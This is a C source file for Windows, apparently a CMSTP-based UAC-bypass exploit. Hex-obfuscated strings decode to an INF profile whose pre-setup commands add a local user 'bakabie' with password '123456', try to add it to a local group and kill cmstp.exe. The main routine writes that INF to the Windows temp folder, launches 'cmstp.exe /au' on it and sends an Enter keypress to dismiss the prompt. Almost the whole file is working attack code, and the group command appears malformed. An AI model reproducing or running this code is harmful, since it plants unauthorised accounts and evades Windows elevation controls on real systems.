﻿#include<stdio.h>
#include<windows.h>
#include<tlhelp32.h>
const char shellcode[]="\x5b\x76\x65\x72\x73\x69\x6f\x6e\x5d\x0d\x0a"
"\x53\x69\x67\x6e\x61\x74\x75\x72\x65\x3d\x24\x63\x68\x69\x63\x61\x67\x6f\x24\x0d\x0a"
"\x41\x64\x76\x61\x6e\x63\x65\x64\x49\x4e\x46\x3d\x32\x2e\x35\x0d\x0a"

"\x5b\x44\x65\x66\x61\x75\x6c\x74\x49\x6e\x73\x74\x61\x6c\x6c\x5d\x0d\x0a"
"\x43\x75\x73\x74\x6f\x6d\x44\x65\x73\x74\x69\x6e\x61\x74\x69\x6f\x6e\x3d\x43\x75\x73\x74\x49\x6e\x73\x74\x44\x65\x73\x74\x53\x65\x63\x74\x69\x6f\x6e\x41\x6c\x6c\x55\x73\x65\x72\x73\x0d\x0a"
"\x52\x75\x6e\x50\x72\x65\x53\x65\x74\x75\x70\x43\x6f\x6d\x6d\x61\x6e\x64\x73\x3d\x52\x75\x6e\x50\x72\x65\x53\x65\x74\x75\x70\x43\x6f\x6d\x6d\x61\x6e\x64\x73\x53\x65\x63\x74\x69\x6f\x6e\x0d\x0a"

"\x5b\x52\x75\x6e\x50\x72\x65\x53\x65\x74\x75\x70\x43\x6f\x6d\x6d\x61\x6e\x64\x73\x53\x65\x63\x74\x69\x6f\x6e\x5d\x0d\x0a"
"\x3b \x43\x6f\x6d\x6d\x61\x6e\x64\x73 \x48\x65\x72\x65 \x77\x69\x6c\x6c \x62\x65 \x72\x75\x6e \x42\x65\x66\x6f\x72\x65 \x53\x65\x74\x75\x70 \x42\x65\x67\x69\x6e\x73 \x74\x6f \x69\x6e\x73\x74\x61\x6c\x6c\x0d\x0a"
"\x6e\x65\x74 \x75\x73\x65\x72 \x62\x61\x6b\x61\x62\x69\x65 \x31\x32\x33\x34\x35\x36 \x2f\x61\x64\x64\x0d\x0a"
"\x6e\x65\x74 \x75\x73\x65\x72 \x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70 \x62\x61\x6b\x61\x62\x69\x65 \x2f\x61\x64\x64\x0d\x0a"
"\x74\x61\x73\x6b\x6b\x69\x6c\x6c \x2f\x49\x4d \x63\x6d\x73\x74\x70\x2e\x65\x78\x65 \x2f\x46\x0d\x0a"

"\x5b\x43\x75\x73\x74\x49\x6e\x73\x74\x44\x65\x73\x74\x53\x65\x63\x74\x69\x6f\x6e\x41\x6c\x6c\x55\x73\x65\x72\x73\x5d\x0d\x0a"
"\x34\x39\x30\x30\x30\x2c\x34\x39\x30\x30\x31\x3d\x41\x6c\x6c\x55\x53\x65\x72\x5f\x4c\x44\x49\x44\x53\x65\x63\x74\x69\x6f\x6e\x2c \x37\x0d\x0a"

"\x5b\x41\x6c\x6c\x55\x53\x65\x72\x5f\x4c\x44\x49\x44\x53\x65\x63\x74\x69\x6f\x6e\x5d\x0d\x0a"
"\x22\x22\x48\x4b\x4c\x4d\x22\x22\x2c \x22\x22\x53\x4f\x46\x54\x57\x41\x52\x45\x5c\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x43\x75\x72\x72\x65\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x5c\x41\x70\x70 \x50\x61\x74\x68\x73\x5c\x43\x4d\x4d\x47\x52\x33\x32\x2e\x45\x58\x45\x22\x22\x2c \x22\x22\x50\x72\x6f\x66\x69\x6c\x65\x49\x6e\x73\x74\x61\x6c\x6c\x50\x61\x74\x68\x22\x22\x2c \x22\x22\x25\x55\x6e\x65\x78\x70\x65\x63\x74\x65\x64\x45\x72\x72\x6f\x72\x25\x22\x22\x2c \x22\x22\x22\x22\x0d\x0a"

"\x5b\x53\x74\x72\x69\x6e\x67\x73\x5d\x0d\x0a"
"\x53\x65\x72\x76\x69\x63\x65\x4e\x61\x6d\x65\x3d\x22\x22\x43\x6f\x72\x70\x56\x50\x4e\x22\x22\x0d\x0a"
"\x53\x68\x6f\x72\x74\x53\x76\x63\x4e\x61\x6d\x65\x3d\x22\x22\x43\x6f\x72\x70\x56\x50\x4e\x22\x22\x0a\x0d\x0a";


const char temp[]="\x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x74\x65\x6d\x70\x5c\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2e\x69\x6e\x66";
char *SHELL="\x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x63\x6d\x73\x74\x70\x2e\x65\x78\x65 \x2f\x61\x75 \x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x74\x65\x6d\x70\x5c\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2e\x69\x6e\x66";


HWND GetWindowHwndByPorcessID(DWORD dwProcessID)
{
    DWORD dwPID = 0;
    HWND hwndRet = NULL;

    HWND hwndWindow = GetTopWindow(0);
    while (hwndWindow)
    {
        dwPID = 0;

        DWORD dwTheardID = GetWindowThreadProcessId(hwndWindow, &dwPID);
        if (dwTheardID != 0)
        {   
           

            if (dwPID == dwProcessID)
            {

                printf("dwpid:%d\nhandle:%d\n",dwPID,hwndWindow);
                hwndRet = hwndWindow;
                
                break;
            }
        }

        hwndWindow = GetNextWindow(hwndWindow, GW_HWNDNEXT);
    }

    HWND hwndWindowParent = NULL;

    while (hwndRet != NULL)
    {
        hwndWindowParent = GetParent(hwndRet);
        if (hwndWindowParent == NULL)
        {
            break;
        }
        hwndRet = hwndWindowParent;
    }

    return hwndRet;

}
DWORD GetProcessIDByName( LPCTSTR szProcessName )
{
STARTUPINFO st;
PROCESS_INFORMATION pi;
PROCESSENTRY32 ps;
HANDLE hSnapshot;
DWORD dwPID;
ZeroMemory(&st, sizeof(STARTUPINFO));
ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
st.cb = sizeof(STARTUPINFO);
ZeroMemory(&ps,sizeof(PROCESSENTRY32));
ps.dwSize = sizeof(PROCESSENTRY32);
// 閬嶅巻杩涚▼ 聽
hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0);
if(hSnapshot == INVALID_HANDLE_VALUE)
{
return 0;
}
if(!Process32First(hSnapshot,&ps))
{
return 0;
}
do
{

if(lstrcmpi(ps.szExeFile,szProcessName)==0)
{

dwPID = ps.th32ProcessID;
CloseHandle(hSnapshot);
return dwPID;
}
}
while(Process32Next(hSnapshot,&ps));

CloseHandle(hSnapshot);
return 0;
}


int main(){
    FILE *fp = NULL;
    
    fp = fopen(temp, "wb");
    fputs(shellcode,fp);
    fclose(fp);
    ShellExecute(0,"open","\x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x63\x6d\x73\x74\x70\x2e\x65\x78\x65","\x2f\x61\x75 \x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x74\x65\x6d\x70\x5c\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2e\x69\x6e\x66","",SW_SHOWNORMAL );
    Sleep(1000);
    DWORD pid = GetProcessIDByName("cmstp.exe");
    HWND hwnd = GetWindowHwndByPorcessID(pid);
    printf("%d\n",pid);
    SetForegroundWindow(hwnd);
    ShowWindow(hwnd,5);
    printf("%d",hwnd);
    /*HWND hwndChild=GetWindow(hwnd,GW_CHILD);
                while(hwndChild)   
				{   
  					hwndChild=GetWindow(hwndChild, GW_HWNDNEXT);
  					char childrenTEXT[256];
  					GetWindowText(hwndChild, childrenTEXT, 256); 
					printf("children:%d\ntitle:%s\n",hwndChild,childrenTEXT);
					if (childrenTEXT=="确定"){
						printf("Find THE BUTTON");
						
					}
					
 				}
 				*/
 	PostMessage((HWND)hwnd,WM_KEYDOWN,VK_RETURN,0);
    PostMessage((HWND)hwnd,WM_KEYUP,VK_RETURN,0);
}
